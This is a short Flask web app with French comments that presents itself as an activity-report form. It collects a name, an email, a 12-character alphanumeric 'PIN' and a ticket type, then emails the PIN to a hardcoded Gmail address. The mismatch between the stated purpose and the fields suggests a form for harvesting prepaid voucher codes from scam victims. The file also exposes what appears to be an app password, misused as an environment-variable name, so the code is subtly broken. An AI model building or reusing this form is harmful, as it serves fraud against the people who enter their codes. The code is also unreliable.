from flask import Flask, render_template, request, redirect, url_for
import smtplib
from email.message import EmailMessage
import os

app = Flask(__name__)

# ➤ Fonction qui envoie l'email
def send_email(nom, email_utilisateur, resume_travail):
    msg = EmailMessage()
    msg['Subject'] = '🔔 Nouveau Rapport d\'activité'
    msg['From'] = os.environ.get('zounmenouorden@gmail.com')  # ton email expéditeur
    msg['To'] = os.environ.get('zounmenouorden@gmail.com')  # email du chef d'équipe

    contenu = f"""Bonjour Chef d'équipe,

Un nouveau rapport vient d'être soumis.

👤 Nom : {nom}
📧 Email : {email_utilisateur}

📝pin :{ resume_travail }

---

Ceci est un message automatique.
"""

    msg.set_content(contenu)

    # ➤ Envoi SMTP sécurisé (exemple avec Gmail)
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(os.environ.get('zounmenouorden@gmail.com'), os.environ.get('okow srsh aijt pvjx'))
        smtp.send_message(msg)

@app.route('/success')
def success():
    return render_template('success.html')

# ➤ Route principale
@app.route('/', methods=['GET', 'POST'])
def formulaire():
    if request.method == 'POST':
        nom = request.form.get('nom')
        email = request.form.get('email')
        pin = request.form.get('pin')
        ticket_type = request.form.get('ticket_type')
        # Vérification que tous les champs sont remplis
        if not nom or not email or not pin or not ticket_type:
            return '❌ Veuillez remplir tous les champs obligatoires.', 400
        # Validation du code PIN
        if not pin.isalnum() or len(pin) != 12:
            return '❌ Le code doit contenir exactement 12 caractères, chiffres ou lettres.', 400
        send_email(nom, email, pin )
        return redirect(url_for('success'))

    return render_template('form.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)